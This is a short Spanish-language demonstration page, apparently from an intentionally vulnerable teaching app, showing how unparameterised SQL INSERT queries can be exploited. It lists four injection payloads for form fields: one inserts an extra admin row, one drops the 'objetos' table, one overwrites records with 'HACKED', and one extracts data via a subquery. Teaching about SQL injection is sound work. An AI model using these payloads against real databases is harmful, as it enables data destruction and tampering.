Demostración de Vulnerabilidad SQL Injection - INSERT

Esta página demuestra cómo las consultas INSERT sin parametrizar pueden ser explotadas.

Ejemplos de ataques SQL Injection en INSERT:

  • Nombre: test'), ('admin', 'X', 'X1'); -- - Inserta registro adicional
  • Descripción: X'); DROP TABLE objetos; -- - Intenta eliminar tabla
  • Ubicación: X'); UPDATE objetos SET descripcion='HACKED' WHERE id=1; -- - Modifica otros registros
  • Nombre: test'), ((SELECT COUNT(*) FROM consultas_rutas), 'H', 'H1'); -- - Extrae información

Tip: Los ataques INSERT pueden ser más sutiles ya que a menudo no devuelven datos directamente, pero pueden modificar la base de datos de manera maliciosa.
